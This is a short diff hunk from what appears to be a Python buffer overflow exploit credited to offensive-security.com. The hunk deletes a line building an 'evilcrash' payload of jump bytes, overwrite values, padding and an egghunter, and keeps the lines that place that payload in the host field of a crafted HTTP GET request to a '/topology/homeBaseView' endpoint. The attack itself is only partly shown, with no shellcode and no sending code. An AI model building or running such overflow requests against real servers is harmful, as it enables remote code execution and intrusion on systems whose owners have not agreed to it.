@@ -24,8 +24,6 @@ print "[*] http://www.offensive-security.com"
 
 # --- #
 
-evilcrash = "\xeb"*1101 + "\x41\x41\x41\x41\x77\x21\x6e\x6c\x35\x6d" + "G"*32 +egghunter + "A"*100 + ":7510"
-
 buffer="GET http://" + evilcrash+ "/topology/homeBaseView HTTP/1.1\r\n"
 buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
 buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
